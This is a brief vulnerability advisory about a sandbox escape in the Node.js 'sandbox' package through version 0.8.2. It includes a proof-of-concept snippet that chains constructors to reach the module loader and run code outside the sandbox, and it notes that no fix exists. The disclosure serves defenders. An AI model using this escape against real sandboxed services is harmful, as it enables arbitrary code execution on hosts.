  Sandbox Breakout / Arbitrary Code Execution in sandbox
  All versions of `sandbox` through 0.8.2 are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.

  ## Proof of concept
  ```
  var Sandbox = require("sandbox")
  s = new Sandbox()
  code = `new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("util").inspect("hi")`
  s.run(code)
  ```


  ## Recommendation

  No fix is currently available. Consider using an alternative module until a fix is made available.
